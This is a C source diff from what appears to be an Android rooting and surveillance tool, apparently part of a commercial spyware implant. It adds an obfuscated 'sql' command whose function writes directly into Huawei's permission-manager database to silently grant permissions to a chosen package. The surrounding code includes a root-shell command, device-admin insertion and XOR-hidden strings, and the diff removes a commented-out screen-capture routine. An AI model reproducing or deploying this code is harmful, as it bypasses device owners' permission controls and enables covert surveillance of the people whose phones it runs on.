@@ -35,6 +35,7 @@
 #include "utils.h"
 #include "boot_manager.h"
 #include "ps.h"
+#include "sqlite3_manager.h"
 
 static int copy(const char *from, const char *to);
 static int log_to_file(const char *full_path, const char *content, const int len);
@@ -50,7 +51,7 @@ static void copy_root_no_mount(const char *src, const char *dst);
 static void copy_remount(const char *mntpnt, const char *src, const char *dst);
 static void delete_root(const char *mntpnt, const char *dst);
 static int search_content(const char *content, const char *file);
-
+static int add_huawei_permission(const char *rcs_pkg);
 
 //static int get_framebuffer(char *filename);
 pid_t server_pid; // extern for parent PID to be killed
@@ -91,6 +92,8 @@ int exec_cmd(int argc, char** argv) {
 	unsigned char fhs[] = "\xe5\xe3\x05\x85\x93\x9a"; // "fhs"
 	unsigned char ape[] = "\xaa\xb4\x1d\xcb\x3a\x37"; // "ape"
 	unsigned char srh[] = "\x05\xcb\xcd\x8a\x89\xf3"; // "srh"
+	unsigned char sql[] = "\xd6\xd7\x02\xab\xa9\x46"; // "sql"
+	
 
 	int i;
 	unsigned char *da, *db;	
@@ -118,7 +121,6 @@ int exec_cmd(int argc, char** argv) {
 	  LOG("qzs - start a root shell\n");
 	  LOG("lid <proc> <dest file> - return process id for <proc> write it to <dest file>\n");
 	  LOG("ape <content> <dest file> - append text <content> to <dest files> if not yet present\n");
-	  LOG("srh <content> <file> - search for <content> in <file>\n");
 	  
 	  return 0;
 	}
@@ -289,86 +291,16 @@ int exec_cmd(int argc, char** argv) {
 		execvp(shell, exec_args);
 
 		LOGD("Exiting shell\n");
-	} 
+	} else if (strcmp(argv[1], deobfuscate(sql)) == 0) {
+
+	  if(!argv[2]) return 0;
+	  
+	  add_huawei_permission(argv[2]);
+
+	}
 
 	return 0;
 }
-
-// Allo stato attuale, la copy funziona meglio... Questa funzione non e' usata
-// Come referenza futura: http://www.pocketmagic.net/?p=1473
-/*static int get_framebuffer(char *filename) {
-	unsigned char fb0[] = "\xef\x1c\xe2\xc0\xbb\xba\xa9\xc0\xb8\xa5\xb6\xa7\xbf\xbe\xb4\xa4\xc0\xb9\xb5\xe7"; // "/dev/graphics/fb0"
-	
-	int fd, fd_out;
-	void *bits;
-	struct fb_var_screeninfo vi;
-	struct fb_fix_screeninfo fi;
-	ssize_t written;
-
-	fd = open(deobfuscate(fb0), O_RDONLY);
-
-	if (fd < 0) {
-		//perror("cannot open fb0");
-		return 0;
-	}
-
-	if (ioctl(fd, FBIOGET_FSCREENINFO, &fi) < 0) {
-		//perror("failed to get fb0 info");
-		return 0; 
-	}
-
-	if (ioctl(fd, FBIOGET_VSCREENINFO, &vi) < 0) {
-		//perror("failed to get fb0 info");
-		return 0;
-	}
-
-
-	bits = mmap(0, fi.smem_len, PROT_READ, MAP_PRIVATE, fd, 0);
-
-	if (bits == MAP_FAILED) {
-		//perror("failed to mmap framebuffer");
-		return 0;
-	}
-
-
-	fd_out = open(filename, O_CREAT | O_RDWR);
-
-	if (fd_out < 0) {
-		//perror("failed to create frame file");
-		return 0;
-	}
-
-	written = write(fd_out, bits, fi.smem_len);
-
-	if (written <= 0) {
-		//perror("cannot write to file");
-		return 0;
-	}
-
-	close(fd);
-	close(fd_out);
-
-	return 0;
-
-	fb->version = sizeof(*fb);
-	fb->width = vi.xres;
-	fb->height = vi.yres;
-	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
-	fb->data = bits;
-	fb->format = GGL_PIXEL_FORMAT_RGB_565;
-
-	fb++;
-
-	fb->version = sizeof(*fb);
-	fb->width = vi.xres;
-	fb->height = vi.yres;
-	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
-	fb->data = (void*) (((unsigned) bits) + vi.yres * vi.xres * 2);
-	fb->format = GGL_PIXEL_FORMAT_RGB_565;
-
-	return fd;
-}*/
-
 
 static int search_content(const char *content, const char *file) {
 	FILE *fd;
@@ -733,6 +665,32 @@ static void add_admin(const char *appname) {
     free(buf);
     close(fd);
     LOGD("Administrator app added successfully\n");
+}
+
+static int add_huawei_permission(const char *rcs_pkg) {
+  unsigned char sys_pkg[] = "\xb0\x55\xfc\xa1\x7c\x73\x4c\x73\xa1\x4d\x4b\x4d\x4c\x7f\x67\xa1\x40\x73\x7d\x65\x73\x79\x7f\x4d\xa6\x48\x67\x64"; // "/data/system/packages.xml"
+  unsigned char hw_db[] = "\x99\x1a\xbc\xca\x0d\x08\x1d\x08\xca\x0d\x08\x1d\x08\xca\x0e\x0a\x14\xcb\x11\x1c\x08\x12\x0c\x10\xcb\x19\x0c\x1f\x14\x10\x1e\x1e\x10\x0a\x0b\x14\x08\x0b\x08\x02\x0c\x1f\xca\x0d\x08\x1d\x08\x0f\x08\x1e\x0c\x1e\xca\x19\x0c\x1f\x14\x10\x1e\x1e\x10\x0a\x0b\xcb\x0d\x0f"; // "/data/data/com.huawei.permissionmanager/databases/permission.db"
+  unsigned char obf_query[] = "\xc5\x29\x9c\x9c\x9d\x96\x80\xe9\x93\x27\x9c\x9d\x93\x9a\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xe5\xe2\x27\x3f\xea\xfc\xe3\x3b\x27\xf7\xe4\xe6\xfe\xe4\xe2\xe0\x9d\xe4\xf8\xe0\x3b\x27\xf0\xfc\xe3\x3b\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xfa\xe3\xe0\x3b\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xe5\xe2\x3c\x27\x95\x84\x9b\x90\x80\x96\x27\x3f\x34\x37\x37\x37\x3b\x27\x22\x20\xf6\x22\x3b\x27\x20\xe3\x3b\x27\x20\xe3\x3b\x27\x37\x3c\x0e"; // "INSERT INTO permissionCfg (_id, packageName, uid, permissionCode, permissionCfg) VALUES (1000, '%s', %d, %d, 0);"
+  int uid;
+  char query[2048];
+  int permissions = 60191;
+  
+  if(!rcs_pkg)
+    return 0;
+
+  uid = get_package_uid(rcs_pkg);    
+  if(!uid) return 0;
+
+  memset(query, 0, sizeof(query));
+  snprintf(query, sizeof(query), deobfuscate(obf_query), rcs_pkg, uid, permissions);
+
+  LOGD("Query: %s\n", query);
+
+  if(sqlite_manager_init()) 
+    sqlite_manager_query(deobfuscate(hw_db), query);
+
+  return 1;
+
 }
 
 
